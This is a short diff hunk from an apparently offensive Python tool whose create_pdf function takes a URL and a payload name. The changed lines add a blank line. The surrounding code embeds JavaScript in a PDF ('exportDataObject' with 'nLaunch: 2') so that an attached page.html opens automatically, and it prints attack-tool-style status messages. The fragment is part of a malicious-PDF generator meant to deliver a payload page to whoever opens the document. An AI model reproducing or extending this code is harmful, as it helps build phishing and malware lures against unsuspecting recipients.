@@ -60,6 +60,7 @@ def create_pdf(url,pdf_name,payload_name): # function to create a pdf, supply th
  meta=PdfFileWriter()
  meta.appendPagesFromReader(unmeta)
  meta.addJS('this.exportDataObject({ cName: "page.html", nLaunch: 2 });')
+ 
  with open("page.html", "rb") as fp:
      print ("\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Attaching page.html to PDF...\033[0m")
      meta.addAttachment("page.html", fp.read())
